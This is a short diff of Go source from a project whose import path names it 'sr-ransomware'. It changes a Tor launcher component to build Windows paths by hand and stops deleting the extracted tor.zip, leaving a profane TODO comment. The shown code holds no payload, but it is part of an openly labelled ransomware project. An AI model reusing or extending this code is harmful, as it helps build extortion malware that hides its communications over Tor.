@@ -5,7 +5,6 @@ package exe
 import (
     "os"
     "os/exec"
-    "path/filepath"
 
     "github.com/sug0/sr-ransomware/go/fs"
     "github.com/sug0/sr-ransomware/go/errors"
@@ -15,16 +14,13 @@ func (t *Tor) Start() error {
     if t.cmd != nil {
         return ErrAlreadyRunning
     }
-    torExePath := filepath.Join(t.path, "tor.exe")
+    torExePath := t.path + `\tor.exe`
     if _, err := os.Stat(torExePath); err != nil {
         err = t.extract()
         if err != nil {
             return err
         }
-        err = os.Remove(torZipPath)
-        if err != nil {
-            return errors.Wrap(pkg, "failed to delete tor zip", err)
-        }
+        // TODO: remove file after extracting, windows is a bitch
     }
     if t.config != "" {
         t.cmd = exec.Command(torExePath, "-f", t.config)
@@ -39,7 +35,7 @@ func (t *Tor) extract() error {
     if err != nil && !os.IsExist(err) {
         return errors.Wrap(pkg, "failed to create tor dir", err)
     }
-    torZipPath := filepath.Join(t.path, "tor.zip")
+    torZipPath := t.path + `\tor.zip`
     f, err := os.Create(torZipPath)
     if err != nil {
         return errors.Wrap(pkg, "failed to create tor zip", err)
